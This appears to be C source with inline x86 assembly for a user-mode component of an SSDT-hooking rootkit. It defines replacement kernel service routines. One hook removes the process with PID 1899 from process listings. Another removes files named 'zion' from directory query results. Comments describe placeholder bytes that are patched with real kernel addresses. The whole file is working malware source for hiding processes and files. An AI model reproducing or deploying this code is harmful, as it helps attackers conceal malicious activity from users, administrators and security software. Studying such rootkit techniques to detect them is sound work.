/*
 *      name: SSDT HOOK COMMAND SENDER
 *      type: USER MODE
 *		Org Author: Liang Chen
 *      Version : 0.2
 */




#include "stdafx.h"
#include "ntstatus.h"

#include "test_ssdt_func.h"


__declspec(naked)  NTSTATUS NewNtCreateProcessEx(OUT PHANDLE  ProcessHandle,
												IN ACCESS_MASK        DesiredAccess,
											    IN DWORD ObjectAttributes OPTIONAL,
												IN HANDLE             ParentProcess,
												IN BOOLEAN            InheritObjectTable,
												IN HANDLE             SectionHandle OPTIONAL,
												IN HANDLE             DebugPort OPTIONAL,
												IN HANDLE             ExceptionPort OPTIONAL,
												IN HANDLE             UNKNOWN)
{
	
	_asm
	{
		push ebp
		mov ebp,esp
		push UNKNOWN
		push ExceptionPort
		push DebugPort
		push SectionHandle
		push InheritObjectTable
		push ParentProcess
		push ObjectAttributes
		push DesiredAccess
		push ProcessHandle
		mov edi,edi
		mov edi,edi
		mov edi,edi
	}

	_asm
	{
	
		pop ebp
		retn 24h
	}
	_asm
	{
		nop
		nop
		nop
		nop
	}

}

__declspec(naked)  NTSTATUS NewZwQuerySystemInformation(
											  IN DWORD SystemInformationClass,
											  OUT PVOID               SystemInformation,
											  IN ULONG                SystemInformationLength,
											  OUT PULONG              ReturnLength OPTIONAL )
{
	_asm
	{
		push ebp
		mov ebp,esp
		push ReturnLength
		push SystemInformationLength
		push SystemInformation
		push SystemInformationClass
		mov edi,edi
		mov edi,edi
		mov edi,edi //这里腾出6个字节，到了内核态时自动填上ZwQuerySystemInformation真实地址
		push eax
		push ebx
		push ecx
		cmp eax, 0
		jnz L_end
	}
	if (5 == SystemInformationClass ) //判断是否枚举进程
	{
		_asm
		{
			mov ecx, SystemInformation
			mov ebx, ecx
			add ecx, [ebx]
		}
		_asm
		{
L_search:
			cmp dword ptr [ecx+0x44], 1899 //判断pid是否为待隐藏进程
			jz L_cut
			mov ebx, ecx	//如果不是，继续搜索
			add ecx, [ebx]
			cmp ebx,ecx
			jnz L_search	//循环搜索
			jmp L_end		//搜索失败，指定的pid不存在
		}
		_asm
		{
L_cut:
			cmp dword ptr [ecx], 0  //判断待隐藏进程是否在链表尾部
			jz L_cuttail
			mov eax, [ecx]	
			add [ebx],eax		//修改NextEntryDelta值
			jmp L_end
L_cuttail:
			mov [ebx],0  //修改NextEntryDelta值

		}
	}

	_asm
	{
L_end:
		pop ecx
		pop ebx
		pop eax
		pop ebp
		retn 10h
	}
	_asm
	{
		nop		//函数结束标志，方便传入内核态后，计算该函数的长度
		nop
		nop
		nop
	}


}
__declspec(naked)  NTSTATUS NewNtQueryDirectoryFile(
															  IN HANDLE               FileHandle,
															  IN HANDLE               Event OPTIONAL,
															  IN DWORD      ApcRoutine OPTIONAL,
															  IN PVOID                ApcContext OPTIONAL,
															  OUT DWORD    IoStatusBlock,
															  OUT PVOID               FileInformation,
															  IN DWORD                strLength,
															  IN DWORD FileInformationClass,
															  IN BOOLEAN              ReturnSingleEntry,
															  IN DWORD      FileMask OPTIONAL,
															  IN BOOLEAN              RestartScan )
{
	_asm
	{
		push ebp
		mov ebp,esp
		push RestartScan
		push FileMask
		push ReturnSingleEntry
		push FileInformationClass
		push strLength
		push FileInformation
		push IoStatusBlock
		push ApcContext
		push ApcRoutine
		push Event
		push FileHandle
		mov edi,edi
		mov edi,edi
		mov edi,edi ////这里腾出6个字节，到了内核态时自动填上NtQueryDirectoryFile真实地址
		push eax
		push ebx
		push ecx
		cmp eax, 0
		jnz L_end
	}
	if (3 == FileInformationClass )
	{
		_asm
		{
			mov ecx, FileInformation
			mov ebx, 0
			//add ecx, [ebx]
		}
		_asm
		{
L_search:
			cmp dword ptr [ecx+0x5e], 0x0069007a
			jnz L_Next
			cmp dword ptr [ecx+0x62], 0x006e006f //Unicode L"zion"
			jz L_cut
L_Next:
			mov ebx, ecx  //同上，不再叙述
L_Next_1:
			add ecx, [ebx]

			cmp ebx,ecx
			jnz L_search
			jmp L_end
		}
		_asm
		{
L_cut:
			cmp dword ptr [ecx], 0
			jz L_cuttail
			mov eax, [ecx]
			add [ebx],eax
			mov ecx, ebx
			jmp L_Next_1
L_cuttail:
			cmp ebx,0
			jz L_return
			mov dword ptr[ebx],0
			jmp L_end
L_return:
			mov dword ptr[esp-0xc], 0x80000006
			jmp L_end
		}
	}

	_asm
	{
L_end:
		pop ecx
		pop ebx
		pop eax
		pop ebp
		retn 2Ch
	}
	_asm
	{
		nop
		nop
		nop
		nop
	}
}